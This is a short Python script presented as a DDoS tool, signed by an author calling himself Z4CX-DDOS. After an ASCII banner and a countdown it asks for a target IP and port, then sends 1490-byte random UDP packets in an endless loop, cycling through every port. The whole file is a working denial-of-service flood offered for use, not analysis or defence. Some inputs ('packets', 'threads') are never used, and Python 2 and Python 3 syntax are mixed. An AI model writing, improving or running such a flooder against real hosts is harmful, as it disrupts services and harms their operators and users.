import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("")
print("\033[91m  ⁰ ⁰ ⁰ ⁰      ⁰  ⁰     \033[0m")
print("\033[91m       ⁰      ⁰   ⁰      \033[0m")
print("\033[91m      ⁰      ⁰    ⁰      \033[0m")
print("\033[30m     ⁰      ⁰ ⁰ ⁰ ⁰       \033[0m")
print("\033[30m    ⁰             ⁰⁰      \033[0m")
print("\033[30m   ⁰ ⁰ ⁰ ⁰        ⁰        \033[0m")
print ("\033[01mAuthor   : Z4CX-DDOS\033[0m")
print ("\033[01mgithub   : https://github.com/Z4CX-DDOS\033[0m")
print("")
ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
print("\033[33m———————————————————————————⟩⟩")
port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
print("\033[32m———————————————————————————⟩⟩")
packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
print("\033[31m———————————————————————————⟩⟩")
thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
print("\033[94m———————————————————————————⟩⟩"),
time.sleep(5),
print("\033[96m              ⟩⟩ 1 \033[0m "),
time.sleep(5),
print("\033[92m              ⟩⟩ 2 \033[0m "),
time.sleep(5),
print("\033[1m              ⟩⟩ 3 \033[0m "),
time.sleep(5),
print("\033[97m              ⟩⟩ 4 \033[0m "),
time.sleep(5),
print("\033[95m              ⟩⟩ 5 \033[0m "),
time.sleep(5),
time.sleep(5),
print("\033[96m              ⟩⟩ MENUNGGU KONEKSI SERVER <<\033[0m "),

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1


